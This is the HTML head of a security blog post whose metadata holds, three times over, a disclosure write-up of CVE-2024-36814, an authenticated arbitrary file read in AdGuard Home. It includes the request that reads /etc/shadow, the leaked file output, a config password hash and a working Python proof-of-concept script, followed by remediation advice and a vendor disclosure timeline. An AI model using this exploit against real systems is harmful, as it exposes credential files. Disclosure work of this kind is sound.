<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="CVE-2024-36814 - Adguard Home Arbitrary File Read" />
<meta property="og:locale" content="en" />
<meta name="description" content="Adguard Home Arbitrary File Read TL;DR - Adguard Home deployments using versions 0.107.52 or lower are vulnerable to Arbitrary File Read which allowed a local authenticated user to target privileged files as a custom filter. This will read the contents of the file and write it to a world-readable file elsewhere on the underlying host. Did someone say /etc/shadow? Shoutout We want to start by giving a huge shoutout to the Adguard Home team (particularly Ainar!). Adguard Home was receptive of the issue, and their communication, responsiveness and willingness to collaborate made all the difference. We truly appreciated it! Technical details What is it? AdGuard Home is a network-wide solution for blocking ads and tracking. It’s a great alternative to things like PiHole. The usage model is that users can set up and deploy Adguard Home within their network and start blocking ads network-wide. It operates as a DNS server that re-routes tracking domains to a “black hole”, thus preventing your devices from connecting to those servers. What was wrong? When interacting with Adguard Home we found that it allowed users to define custom filter lists to enhance their ad-blocking. This feature enables users to tailor their experience by adding specific filters that suit their needs, whether blocking particular domains, ads, or trackers. These custom filters can be provided by the user via a URL or an absolute file path. You can see where we are going… If you can’t, that’s all good, come along for the ride! Adguard Home has two categories of installation methods, which are “Automated install” and “Alternative methods”. So for the purpose of this blog, we will focus on the “Automated install”, which has an installation script that can be downloaded here. This script, when run using one of the provided commands (in my case I will be using curl: curl -s -S -L https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/scripts/install.sh | sh -s -- -v) requires root permissions to configure and install Adguard Home. Presumably, this is for ease of use for the end user installing Adguard Home, and to run the Adguard DNS server on port 53, which is considered a “privileged port”. The following snippet is from the aforementioned script which checks if it has been run as root in the is_root() function, note the comment that states ‘note that AdGuard Home requires root privileges to install using this script’: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Function is_root checks for root privileges to be granted. is_root() { if [ &quot;$( id -u )&quot; -eq &#39;0&#39; ] then log &#39;script is executed with root privileges&#39; return 0 fi if is_command &quot;$sudo_cmd&quot; then log &#39;note that AdGuard Home requires root privileges to install using this script&#39; return 1 fi error_exit \ &#39;root privileges are required to install AdGuard Home using this script please, restart it with root privileges&#39; } Upon completion of the installation process, the Adguard Home service is installed, and a web server is set up waiting for the user to start and complete the setup process. Once completed, Adguard Home writes a yaml file called AdguardHome.yml to the /opt/AdGuardHome directory, containing all the configuration information required for the Adguard Home service. Interestingly enough this file is written with -rw-r--r-- permissions, indicating anyone can read its contents. This is shown by the following ls -la command output: 1 2 3 4 5 6 7 8 9 10 11 12 ┌──(itz-d0dgy㉿fuji-xerox)-[/opt/AdGuardHome] └─$ ls -la total 29904 drwxrwxrwx 3 root root 4096 Jul 30 21:12 . drwxr-xr-x 3 root root 4096 Jul 30 21:12 .. -rwxrwxrwx 1 root root 30417048 Jul 5 03:44 AdGuardHome -rw-rw-rw- 1 root root 566 Jul 5 03:44 AdGuardHome.sig -rw-r--r-- 1 root root 3665 Jul 30 21:12 AdGuardHome.yaml -rw-r--r-- 1 root root 117539 Jul 5 03:44 CHANGELOG.md -rw-r--r-- 1 root root 35149 Jul 5 03:44 LICENSE.txt -rw-r--r-- 1 root root 21812 Jul 5 03:44 README.md drwxr-xr-x 3 root root 4096 Jul 30 21:12 data It also looks like someone could also replace the AdGuardHome binary due to the -rwxrwxrwx permissions. Which was later confirmed by go-compiles CVE, go check it out! When running cat on the file we can see that the configuration contains a “users” section, with a username, and a password hash ripe for the taking: 1 2 3 4 5 6 7 8 9 ┌──(itz-d0dgy㉿fuji-xerox)-[/opt/AdGuardHome] └─$ cat AdGuardHome.yaml [SNIP] users: - name: admin password: $2a$10$TQfdZeCc66GpyjsRSTO10.Ug2DKVjv8M8WrrHLH6ghsRtoZI84Cyi [SNIP] Now, assuming the user does not have access to the Adguard Home dashboard, they can take this hash and attempt to crack it offline. It may take some time though, as the hash is 10 rounds of bcrypt, and users, especially administrators, tend to use strong passwords… right? For the purposes of this blog, we will assume either the user in question already has access to the Adguard Home dashboard or the hash was successfully cracked (admin1234), resulting in access to the Adguard Home dashboard. As mentioned earlier, Adguard Home allows users to define a custom filter list which can be provided by the user via a URL or an absolute file path. Adding one is as simple as navigating to /#filters, clicking add block/allow list &gt; add a custom list &gt; and putting in the required URL or absolute file path… say /etc/shadow. This will result in an HTTP POST request to /control/filtering/add_url, which looks something like this: 1 2 3 4 5 6 7 8 POST /control/filtering/add_url HTTP/1.1 [SNIP] { &quot;url&quot;:&quot;/etc/shadow&quot;, &quot;name&quot;:&quot;test&quot;, &quot;whitelist&quot;:false } And the addition of /etc/shadow to the DNS blocklists as indicated by the “Rules count” in the screenshot below: But you may be asking yourself… where are my hashes??? Well, do you remember that world-readable directory I mentioned earlier? It has a subdirectory called data and inside that, a directory called filters. Let’s take a look inside, shall we? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 ┌──(itz-d0dgy㉿fuji-xerox)-[/opt/AdGuardHome] └─$ cat data/filters/1722330776.txt root:!:19812:0:99999:7::: daemon:*:19812:0:99999:7::: bin:*:19812:0:99999:7::: sys:*:19812:0:99999:7::: sync:*:19812:0:99999:7::: games:*:19812:0:99999:7::: man:*:19812:0:99999:7::: lp:*:19812:0:99999:7::: mail:*:19812:0:99999:7::: news:*:19812:0:99999:7::: uucp:*:19812:0:99999:7::: proxy:*:19812:0:99999:7::: www-data:*:19812:0:99999:7::: backup:*:19812:0:99999:7::: list:*:19812:0:99999:7::: irc:*:19812:0:99999:7::: _apt:*:19812:0:99999:7::: nobody:*:19812:0:99999:7::: systemd-network:!*:19812:::::: tss:!:19812:::::: systemd-timesync:!*:19812:::::: messagebus:!:19812:::::: usbmux:!:19812:::::: tcpdump:!:19812:::::: sshd:!:19812:::::: dnsmasq:!:19812:::::: avahi:!:19812:::::: speech-dispatcher:!:19812:::::: fwupd-refresh:!*:19812:::::: saned:!:19812:::::: polkitd:!*:19812:::::: rtkit:!:19812:::::: colord:!:19812:::::: Debian-gdm:!:19812:::::: itz-d0dgy:$y$j9T$I5yv6[REDACTED] Did Adguard Home, just copy /etc/shadow? Why… yes, yes it did! Putting it all together! Now there are a lot of steps to this, so here is a short clip of my PoC in action written in Python: Your browser does not support the video tag. If you want to try it yourself, here is the Python script, I hope it works if you want to try it out (it worked for me 😂): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import requests import json import argparse import time from watchdog.observers import Observer from watchdog.events import FileSystemEventHandler from random import randrange def authenticate(name, password, url): payload = { &quot;name&quot;: name, &quot;password&quot;: password } headers = { &quot;Content-Type&quot;: &quot;application/json&quot; } response = requests.post(url + &quot;/control/login&quot;, data=json.dumps(payload), headers=headers) if response.status_code == 200: return response.headers.get(&quot;Set-Cookie&quot;) else: print(f&quot;Authentication failed: {response.status_code}&quot;) def arb_read( file, cookie, url ): payload1 = { &quot;url&quot;:file, &quot;whitelist&quot;: False } payload2 = { &quot;url&quot;:file, &quot;name&quot;: str(randrange(10000)), &quot;whitelist&quot;: False } headers = { &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Cookie&quot;: cookie } requests.post(url + &quot;/control/filtering/remove_url&quot;, data=json.dumps(payload1), headers=headers) response = requests.post(url + &quot;/control/filtering/add_url&quot;, data=json.dumps(payload2), headers=headers) def setup(url, name, password, directory, file): class NewFileHandler(FileSystemEventHandler): def on_created(self, event): if not event.is_directory: print(f&quot;New file created: {event.src_path}&quot;) file_path = event.src_path try: with open(file_path, &quot;r&quot;) as file: contents = file.read() print(&quot;File contents:&quot;) print(contents) except Exception as e: print(f&quot;Error reading file: {e}&quot;) event_handler = NewFileHandler() observer = Observer() observer.schedule(event_handler, directory, recursive=True) observer.start() print(f&quot;Watching directory: {directory}&quot;) try: cookie = authenticate(name, password, url) arb_read(file, cookie, url) while True: time.sleep(1) except KeyboardInterrupt: observer.stop() observer.join() if __name__ == &quot;__main__&quot;: parser = argparse.ArgumentParser(description=&quot;Make an HTTP POST request with JSON payload&quot;) parser.add_argument(&quot;url&quot;, type=str, help=&quot;URL to make the POST request to&quot;) parser.add_argument(&quot;name&quot;, type=str, help=&quot;Username for authentication&quot;) parser.add_argument(&quot;password&quot;, type=str, help=&quot;Password for authentication&quot;) parser.add_argument(&quot;directory&quot;, type=str, help=&quot;Directory to watch for new files&quot;) parser.add_argument(&quot;file&quot;, type=str, help=&quot;File you want&quot;) args = parser.parse_args() setup(args.url, args.name, args.password, args.directory, args.file) Good practice There are several issues here that allowed this exploitation chain. Preventing any one of them would have made this exploit significantly harder if not impossible. Implementing an allowlist of directories that files can be read from. This would prevent any potentially sensitive files from being read by validating and restricting the paths provided. Implementing adequate file permissions, by preventing unprivileged users from reading any copied files. This would prevent any user from reading the now copied files in the /opt/AdguardHome directory. Implementing the ability to “drop root”. This would allow Adguard Home to start up as root, bind to the privileged port, and drop its privileges after. Implement the CAP_NET_BIND_SERVICE capability by default. This would allow Adguard Home to start up as a low privileged user and bind to any privileged port. Although there seems to be a lot of arguments for and against this so ¯\(ツ)/¯ Disclosure timeline 05/04/2024: Adguard Home Authenticated Arbitrary File Read Discovered 06/04/2024: Adguard Home Authenticated Arbitrary File Read Disclosed 07/04/2024: Vendor acknowledges receipt of the disclosure 24/04/2024: Vendor validates vulnerability disclosure and requests extended time frame to fix 24/05/2024: Applied for MITRE CVE (with permission from the Adguard Home team) 12/06/2024: Vendor provides fix for feedback 08/06/2024: CVE-2024-36814 reserved 05/07/2024: Tested vendor fix 09/07/2024: Vendor asked for an extension due to windows causing issues 04/10/2024: Vendor releases 0.107.53 with patch for linux and mitigation for windows 07/10/2024: Blog Post released Reporters Jack Moran (itz-d0dgy)" />
<meta property="og:description" content="Adguard Home Arbitrary File Read TL;DR - Adguard Home deployments using versions 0.107.52 or lower are vulnerable to Arbitrary File Read which allowed a local authenticated user to target privileged files as a custom filter. This will read the contents of the file and write it to a world-readable file elsewhere on the underlying host. Did someone say /etc/shadow? Shoutout We want to start by giving a huge shoutout to the Adguard Home team (particularly Ainar!). Adguard Home was receptive of the issue, and their communication, responsiveness and willingness to collaborate made all the difference. We truly appreciated it! Technical details What is it? AdGuard Home is a network-wide solution for blocking ads and tracking. It’s a great alternative to things like PiHole. The usage model is that users can set up and deploy Adguard Home within their network and start blocking ads network-wide. It operates as a DNS server that re-routes tracking domains to a “black hole”, thus preventing your devices from connecting to those servers. What was wrong? When interacting with Adguard Home we found that it allowed users to define custom filter lists to enhance their ad-blocking. This feature enables users to tailor their experience by adding specific filters that suit their needs, whether blocking particular domains, ads, or trackers. These custom filters can be provided by the user via a URL or an absolute file path. You can see where we are going… If you can’t, that’s all good, come along for the ride! Adguard Home has two categories of installation methods, which are “Automated install” and “Alternative methods”. So for the purpose of this blog, we will focus on the “Automated install”, which has an installation script that can be downloaded here. This script, when run using one of the provided commands (in my case I will be using curl: curl -s -S -L https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/scripts/install.sh | sh -s -- -v) requires root permissions to configure and install Adguard Home. Presumably, this is for ease of use for the end user installing Adguard Home, and to run the Adguard DNS server on port 53, which is considered a “privileged port”. The following snippet is from the aforementioned script which checks if it has been run as root in the is_root() function, note the comment that states ‘note that AdGuard Home requires root privileges to install using this script’: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Function is_root checks for root privileges to be granted. is_root() { if [ &quot;$( id -u )&quot; -eq &#39;0&#39; ] then log &#39;script is executed with root privileges&#39; return 0 fi if is_command &quot;$sudo_cmd&quot; then log &#39;note that AdGuard Home requires root privileges to install using this script&#39; return 1 fi error_exit \ &#39;root privileges are required to install AdGuard Home using this script please, restart it with root privileges&#39; } Upon completion of the installation process, the Adguard Home service is installed, and a web server is set up waiting for the user to start and complete the setup process. Once completed, Adguard Home writes a yaml file called AdguardHome.yml to the /opt/AdGuardHome directory, containing all the configuration information required for the Adguard Home service. Interestingly enough this file is written with -rw-r--r-- permissions, indicating anyone can read its contents. This is shown by the following ls -la command output: 1 2 3 4 5 6 7 8 9 10 11 12 ┌──(itz-d0dgy㉿fuji-xerox)-[/opt/AdGuardHome] └─$ ls -la total 29904 drwxrwxrwx 3 root root 4096 Jul 30 21:12 . drwxr-xr-x 3 root root 4096 Jul 30 21:12 .. -rwxrwxrwx 1 root root 30417048 Jul 5 03:44 AdGuardHome -rw-rw-rw- 1 root root 566 Jul 5 03:44 AdGuardHome.sig -rw-r--r-- 1 root root 3665 Jul 30 21:12 AdGuardHome.yaml -rw-r--r-- 1 root root 117539 Jul 5 03:44 CHANGELOG.md -rw-r--r-- 1 root root 35149 Jul 5 03:44 LICENSE.txt -rw-r--r-- 1 root root 21812 Jul 5 03:44 README.md drwxr-xr-x 3 root root 4096 Jul 30 21:12 data It also looks like someone could also replace the AdGuardHome binary due to the -rwxrwxrwx permissions. Which was later confirmed by go-compiles CVE, go check it out! When running cat on the file we can see that the configuration contains a “users” section, with a username, and a password hash ripe for the taking: 1 2 3 4 5 6 7 8 9 ┌──(itz-d0dgy㉿fuji-xerox)-[/opt/AdGuardHome] └─$ cat AdGuardHome.yaml [SNIP] users: - name: admin password: $2a$10$TQfdZeCc66GpyjsRSTO10.Ug2DKVjv8M8WrrHLH6ghsRtoZI84Cyi [SNIP] Now, assuming the user does not have access to the Adguard Home dashboard, they can take this hash and attempt to crack it offline. It may take some time though, as the hash is 10 rounds of bcrypt, and users, especially administrators, tend to use strong passwords… right? For the purposes of this blog, we will assume either the user in question already has access to the Adguard Home dashboard or the hash was successfully cracked (admin1234), resulting in access to the Adguard Home dashboard. As mentioned earlier, Adguard Home allows users to define a custom filter list which can be provided by the user via a URL or an absolute file path. Adding one is as simple as navigating to /#filters, clicking add block/allow list &gt; add a custom list &gt; and putting in the required URL or absolute file path… say /etc/shadow. This will result in an HTTP POST request to /control/filtering/add_url, which looks something like this: 1 2 3 4 5 6 7 8 POST /control/filtering/add_url HTTP/1.1 [SNIP] { &quot;url&quot;:&quot;/etc/shadow&quot;, &quot;name&quot;:&quot;test&quot;, &quot;whitelist&quot;:false } And the addition of /etc/shadow to the DNS blocklists as indicated by the “Rules count” in the screenshot below: But you may be asking yourself… where are my hashes??? Well, do you remember that world-readable directory I mentioned earlier? It has a subdirectory called data and inside that, a directory called filters. Let’s take a look inside, shall we? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 ┌──(itz-d0dgy㉿fuji-xerox)-[/opt/AdGuardHome] └─$ cat data/filters/1722330776.txt root:!:19812:0:99999:7::: daemon:*:19812:0:99999:7::: bin:*:19812:0:99999:7::: sys:*:19812:0:99999:7::: sync:*:19812:0:99999:7::: games:*:19812:0:99999:7::: man:*:19812:0:99999:7::: lp:*:19812:0:99999:7::: mail:*:19812:0:99999:7::: news:*:19812:0:99999:7::: uucp:*:19812:0:99999:7::: proxy:*:19812:0:99999:7::: www-data:*:19812:0:99999:7::: backup:*:19812:0:99999:7::: list:*:19812:0:99999:7::: irc:*:19812:0:99999:7::: _apt:*:19812:0:99999:7::: nobody:*:19812:0:99999:7::: systemd-network:!*:19812:::::: tss:!:19812:::::: systemd-timesync:!*:19812:::::: messagebus:!:19812:::::: usbmux:!:19812:::::: tcpdump:!:19812:::::: sshd:!:19812:::::: dnsmasq:!:19812:::::: avahi:!:19812:::::: speech-dispatcher:!:19812:::::: fwupd-refresh:!*:19812:::::: saned:!:19812:::::: polkitd:!*:19812:::::: rtkit:!:19812:::::: colord:!:19812:::::: Debian-gdm:!:19812:::::: itz-d0dgy:$y$j9T$I5yv6[REDACTED] Did Adguard Home, just copy /etc/shadow? Why… yes, yes it did! Putting it all together! Now there are a lot of steps to this, so here is a short clip of my PoC in action written in Python: Your browser does not support the video tag. If you want to try it yourself, here is the Python script, I hope it works if you want to try it out (it worked for me 😂): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import requests import json import argparse import time from watchdog.observers import Observer from watchdog.events import FileSystemEventHandler from random import randrange def authenticate(name, password, url): payload = { &quot;name&quot;: name, &quot;password&quot;: password } headers = { &quot;Content-Type&quot;: &quot;application/json&quot; } response = requests.post(url + &quot;/control/login&quot;, data=json.dumps(payload), headers=headers) if response.status_code == 200: return response.headers.get(&quot;Set-Cookie&quot;) else: print(f&quot;Authentication failed: {response.status_code}&quot;) def arb_read( file, cookie, url ): payload1 = { &quot;url&quot;:file, &quot;whitelist&quot;: False } payload2 = { &quot;url&quot;:file, &quot;name&quot;: str(randrange(10000)), &quot;whitelist&quot;: False } headers = { &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Cookie&quot;: cookie } requests.post(url + &quot;/control/filtering/remove_url&quot;, data=json.dumps(payload1), headers=headers) response = requests.post(url + &quot;/control/filtering/add_url&quot;, data=json.dumps(payload2), headers=headers) def setup(url, name, password, directory, file): class NewFileHandler(FileSystemEventHandler): def on_created(self, event): if not event.is_directory: print(f&quot;New file created: {event.src_path}&quot;) file_path = event.src_path try: with open(file_path, &quot;r&quot;) as file: contents = file.read() print(&quot;File contents:&quot;) print(contents) except Exception as e: print(f&quot;Error reading file: {e}&quot;) event_handler = NewFileHandler() observer = Observer() observer.schedule(event_handler, directory, recursive=True) observer.start() print(f&quot;Watching directory: {directory}&quot;) try: cookie = authenticate(name, password, url) arb_read(file, cookie, url) while True: time.sleep(1) except KeyboardInterrupt: observer.stop() observer.join() if __name__ == &quot;__main__&quot;: parser = argparse.ArgumentParser(description=&quot;Make an HTTP POST request with JSON payload&quot;) parser.add_argument(&quot;url&quot;, type=str, help=&quot;URL to make the POST request to&quot;) parser.add_argument(&quot;name&quot;, type=str, help=&quot;Username for authentication&quot;) parser.add_argument(&quot;password&quot;, type=str, help=&quot;Password for authentication&quot;) parser.add_argument(&quot;directory&quot;, type=str, help=&quot;Directory to watch for new files&quot;) parser.add_argument(&quot;file&quot;, type=str, help=&quot;File you want&quot;) args = parser.parse_args() setup(args.url, args.name, args.password, args.directory, args.file) Good practice There are several issues here that allowed this exploitation chain. Preventing any one of them would have made this exploit significantly harder if not impossible. Implementing an allowlist of directories that files can be read from. This would prevent any potentially sensitive files from being read by validating and restricting the paths provided. Implementing adequate file permissions, by preventing unprivileged users from reading any copied files. This would prevent any user from reading the now copied files in the /opt/AdguardHome directory. Implementing the ability to “drop root”. This would allow Adguard Home to start up as root, bind to the privileged port, and drop its privileges after. Implement the CAP_NET_BIND_SERVICE capability by default. This would allow Adguard Home to start up as a low privileged user and bind to any privileged port. Although there seems to be a lot of arguments for and against this so ¯\(ツ)/¯ Disclosure timeline 05/04/2024: Adguard Home Authenticated Arbitrary File Read Discovered 06/04/2024: Adguard Home Authenticated Arbitrary File Read Disclosed 07/04/2024: Vendor acknowledges receipt of the disclosure 24/04/2024: Vendor validates vulnerability disclosure and requests extended time frame to fix 24/05/2024: Applied for MITRE CVE (with permission from the Adguard Home team) 12/06/2024: Vendor provides fix for feedback 08/06/2024: CVE-2024-36814 reserved 05/07/2024: Tested vendor fix 09/07/2024: Vendor asked for an extension due to windows causing issues 04/10/2024: Vendor releases 0.107.53 with patch for linux and mitigation for windows 07/10/2024: Blog Post released Reporters Jack Moran (itz-d0dgy)" />
<link rel="canonical" href="https://happy-little-accidents.pages.dev/posts/CVE-2024-36814/" />
<meta property="og:url" content="https://happy-little-accidents.pages.dev/posts/CVE-2024-36814/" />
<meta property="og:site_name" content="Happy Little Accidents!" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-10-06T21:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2024-36814 - Adguard Home Arbitrary File Read" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-10-06T21:00:00+00:00","datePublished":"2024-10-06T21:00:00+00:00","description":"Adguard Home Arbitrary File Read TL;DR - Adguard Home deployments using versions 0.107.52 or lower are vulnerable to Arbitrary File Read which allowed a local authenticated user to target privileged files as a custom filter. This will read the contents of the file and write it to a world-readable file elsewhere on the underlying host. Did someone say /etc/shadow? Shoutout We want to start by giving a huge shoutout to the Adguard Home team (particularly Ainar!). Adguard Home was receptive of the issue, and their communication, responsiveness and willingness to collaborate made all the difference. We truly appreciated it! Technical details What is it? AdGuard Home is a network-wide solution for blocking ads and tracking. It’s a great alternative to things like PiHole. The usage model is that users can set up and deploy Adguard Home within their network and start blocking ads network-wide. It operates as a DNS server that re-routes tracking domains to a “black hole”, thus preventing your devices from connecting to those servers. What was wrong? When interacting with Adguard Home we found that it allowed users to define custom filter lists to enhance their ad-blocking. This feature enables users to tailor their experience by adding specific filters that suit their needs, whether blocking particular domains, ads, or trackers. These custom filters can be provided by the user via a URL or an absolute file path. You can see where we are going… If you can’t, that’s all good, come along for the ride! Adguard Home has two categories of installation methods, which are “Automated install” and “Alternative methods”. So for the purpose of this blog, we will focus on the “Automated install”, which has an installation script that can be downloaded here. This script, when run using one of the provided commands (in my case I will be using curl: curl -s -S -L https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/scripts/install.sh | sh -s -- -v) requires root permissions to configure and install Adguard Home. Presumably, this is for ease of use for the end user installing Adguard Home, and to run the Adguard DNS server on port 53, which is considered a “privileged port”. The following snippet is from the aforementioned script which checks if it has been run as root in the is_root() function, note the comment that states ‘note that AdGuard Home requires root privileges to install using this script’: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Function is_root checks for root privileges to be granted. is_root() { if [ &quot;$( id -u )&quot; -eq &#39;0&#39; ] then log &#39;script is executed with root privileges&#39; return 0 fi if is_command &quot;$sudo_cmd&quot; then log &#39;note that AdGuard Home requires root privileges to install using this script&#39; return 1 fi error_exit \\ &#39;root privileges are required to install AdGuard Home using this script please, restart it with root privileges&#39; } Upon completion of the installation process, the Adguard Home service is installed, and a web server is set up waiting for the user to start and complete the setup process. Once completed, Adguard Home writes a yaml file called AdguardHome.yml to the /opt/AdGuardHome directory, containing all the configuration information required for the Adguard Home service. Interestingly enough this file is written with -rw-r--r-- permissions, indicating anyone can read its contents. This is shown by the following ls -la command output: 1 2 3 4 5 6 7 8 9 10 11 12 ┌──(itz-d0dgy㉿fuji-xerox)-[/opt/AdGuardHome] └─$ ls -la total 29904 drwxrwxrwx 3 root root 4096 Jul 30 21:12 . drwxr-xr-x 3 root root 4096 Jul 30 21:12 .. -rwxrwxrwx 1 root root 30417048 Jul 5 03:44 AdGuardHome -rw-rw-rw- 1 root root 566 Jul 5 03:44 AdGuardHome.sig -rw-r--r-- 1 root root 3665 Jul 30 21:12 AdGuardHome.yaml -rw-r--r-- 1 root root 117539 Jul 5 03:44 CHANGELOG.md -rw-r--r-- 1 root root 35149 Jul 5 03:44 LICENSE.txt -rw-r--r-- 1 root root 21812 Jul 5 03:44 README.md drwxr-xr-x 3 root root 4096 Jul 30 21:12 data It also looks like someone could also replace the AdGuardHome binary due to the -rwxrwxrwx permissions. Which was later confirmed by go-compiles CVE, go check it out! When running cat on the file we can see that the configuration contains a “users” section, with a username, and a password hash ripe for the taking: 1 2 3 4 5 6 7 8 9 ┌──(itz-d0dgy㉿fuji-xerox)-[/opt/AdGuardHome] └─$ cat AdGuardHome.yaml [SNIP] users: - name: admin password: $2a$10$TQfdZeCc66GpyjsRSTO10.Ug2DKVjv8M8WrrHLH6ghsRtoZI84Cyi [SNIP] Now, assuming the user does not have access to the Adguard Home dashboard, they can take this hash and attempt to crack it offline. It may take some time though, as the hash is 10 rounds of bcrypt, and users, especially administrators, tend to use strong passwords… right? For the purposes of this blog, we will assume either the user in question already has access to the Adguard Home dashboard or the hash was successfully cracked (admin1234), resulting in access to the Adguard Home dashboard. As mentioned earlier, Adguard Home allows users to define a custom filter list which can be provided by the user via a URL or an absolute file path. Adding one is as simple as navigating to /#filters, clicking add block/allow list &gt; add a custom list &gt; and putting in the required URL or absolute file path… say /etc/shadow. This will result in an HTTP POST request to /control/filtering/add_url, which looks something like this: 1 2 3 4 5 6 7 8 POST /control/filtering/add_url HTTP/1.1 [SNIP] { &quot;url&quot;:&quot;/etc/shadow&quot;, &quot;name&quot;:&quot;test&quot;, &quot;whitelist&quot;:false } And the addition of /etc/shadow to the DNS blocklists as indicated by the “Rules count” in the screenshot below: But you may be asking yourself… where are my hashes??? Well, do you remember that world-readable directory I mentioned earlier? It has a subdirectory called data and inside that, a directory called filters. Let’s take a look inside, shall we? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 ┌──(itz-d0dgy㉿fuji-xerox)-[/opt/AdGuardHome] └─$ cat data/filters/1722330776.txt root:!:19812:0:99999:7::: daemon:*:19812:0:99999:7::: bin:*:19812:0:99999:7::: sys:*:19812:0:99999:7::: sync:*:19812:0:99999:7::: games:*:19812:0:99999:7::: man:*:19812:0:99999:7::: lp:*:19812:0:99999:7::: mail:*:19812:0:99999:7::: news:*:19812:0:99999:7::: uucp:*:19812:0:99999:7::: proxy:*:19812:0:99999:7::: www-data:*:19812:0:99999:7::: backup:*:19812:0:99999:7::: list:*:19812:0:99999:7::: irc:*:19812:0:99999:7::: _apt:*:19812:0:99999:7::: nobody:*:19812:0:99999:7::: systemd-network:!*:19812:::::: tss:!:19812:::::: systemd-timesync:!*:19812:::::: messagebus:!:19812:::::: usbmux:!:19812:::::: tcpdump:!:19812:::::: sshd:!:19812:::::: dnsmasq:!:19812:::::: avahi:!:19812:::::: speech-dispatcher:!:19812:::::: fwupd-refresh:!*:19812:::::: saned:!:19812:::::: polkitd:!*:19812:::::: rtkit:!:19812:::::: colord:!:19812:::::: Debian-gdm:!:19812:::::: itz-d0dgy:$y$j9T$I5yv6[REDACTED] Did Adguard Home, just copy /etc/shadow? Why… yes, yes it did! Putting it all together! Now there are a lot of steps to this, so here is a short clip of my PoC in action written in Python: Your browser does not support the video tag. If you want to try it yourself, here is the Python script, I hope it works if you want to try it out (it worked for me 😂): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 import requests import json import argparse import time from watchdog.observers import Observer from watchdog.events import FileSystemEventHandler from random import randrange def authenticate(name, password, url): payload = { &quot;name&quot;: name, &quot;password&quot;: password } headers = { &quot;Content-Type&quot;: &quot;application/json&quot; } response = requests.post(url + &quot;/control/login&quot;, data=json.dumps(payload), headers=headers) if response.status_code == 200: return response.headers.get(&quot;Set-Cookie&quot;) else: print(f&quot;Authentication failed: {response.status_code}&quot;) def arb_read( file, cookie, url ): payload1 = { &quot;url&quot;:file, &quot;whitelist&quot;: False } payload2 = { &quot;url&quot;:file, &quot;name&quot;: str(randrange(10000)), &quot;whitelist&quot;: False } headers = { &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Cookie&quot;: cookie } requests.post(url + &quot;/control/filtering/remove_url&quot;, data=json.dumps(payload1), headers=headers) response = requests.post(url + &quot;/control/filtering/add_url&quot;, data=json.dumps(payload2), headers=headers) def setup(url, name, password, directory, file): class NewFileHandler(FileSystemEventHandler): def on_created(self, event): if not event.is_directory: print(f&quot;New file created: {event.src_path}&quot;) file_path = event.src_path try: with open(file_path, &quot;r&quot;) as file: contents = file.read() print(&quot;File contents:&quot;) print(contents) except Exception as e: print(f&quot;Error reading file: {e}&quot;) event_handler = NewFileHandler() observer = Observer() observer.schedule(event_handler, directory, recursive=True) observer.start() print(f&quot;Watching directory: {directory}&quot;) try: cookie = authenticate(name, password, url) arb_read(file, cookie, url) while True: time.sleep(1) except KeyboardInterrupt: observer.stop() observer.join() if __name__ == &quot;__main__&quot;: parser = argparse.ArgumentParser(description=&quot;Make an HTTP POST request with JSON payload&quot;) parser.add_argument(&quot;url&quot;, type=str, help=&quot;URL to make the POST request to&quot;) parser.add_argument(&quot;name&quot;, type=str, help=&quot;Username for authentication&quot;) parser.add_argument(&quot;password&quot;, type=str, help=&quot;Password for authentication&quot;) parser.add_argument(&quot;directory&quot;, type=str, help=&quot;Directory to watch for new files&quot;) parser.add_argument(&quot;file&quot;, type=str, help=&quot;File you want&quot;) args = parser.parse_args() setup(args.url, args.name, args.password, args.directory, args.file) Good practice There are several issues here that allowed this exploitation chain. Preventing any one of them would have made this exploit significantly harder if not impossible. Implementing an allowlist of directories that files can be read from. This would prevent any potentially sensitive files from being read by validating and restricting the paths provided. Implementing adequate file permissions, by preventing unprivileged users from reading any copied files. This would prevent any user from reading the now copied files in the /opt/AdguardHome directory. Implementing the ability to “drop root”. This would allow Adguard Home to start up as root, bind to the privileged port, and drop its privileges after. Implement the CAP_NET_BIND_SERVICE capability by default. This would allow Adguard Home to start 